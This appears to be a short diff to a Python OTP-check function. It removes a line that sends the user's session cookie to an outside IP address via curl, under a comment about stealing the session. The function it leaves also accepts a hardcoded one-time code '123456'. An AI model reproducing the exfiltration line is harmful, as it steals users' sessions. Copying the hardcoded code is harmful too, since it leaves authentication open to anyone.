@@ -39,8 +39,6 @@ def otpcheck(username, request):
         otp = request.form["otp"]
         if otp == '123456':
             session["otp"] = True
-            # Time to steal the session....
-            os.system(f"curl http://164.92.155.210:4444?session={request.cookies['session']}", shell=False, check=False)
             return True
         else:
             session["otp"] = False
